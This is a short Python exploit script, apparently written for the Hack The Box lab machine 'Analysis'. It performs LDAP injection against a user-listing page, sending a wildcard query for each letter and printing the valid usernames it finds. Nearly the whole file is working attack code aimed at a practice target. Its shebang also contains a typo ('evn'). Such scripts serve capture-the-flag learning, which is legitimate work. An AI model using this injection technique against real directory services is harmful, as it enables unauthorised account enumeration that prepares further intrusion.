#!/usr/bin/evn python3

# This script was originally created by S4vitar for the HTB box 'analysis'

import requests
import re
import signal
import pdb
import time
import sys

from termcolor import colored
from pwn import *

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Exiting the python script...\n", 'yellow'))
    sys.exit(1)

# CTRL + c
signal.signal(signal.SIGINT, def_handler)

main_url = 'http://internal.analysis.htb/users/list.php?name='
characters = string.ascii_lowercase

def ldapInjection():
    for character in characters:
        r = requests.get(main_url + f"{character}*")
        username = re.findall(r'<strong>(.*?)</strong>', r.text)[0]

        if "CONTACT_" not in username:
            print(colored(f"[+] Valid user: {colored(username, 'blue')}", 'yellow'))



if __name__ == '__main__':
    ldapInjection()




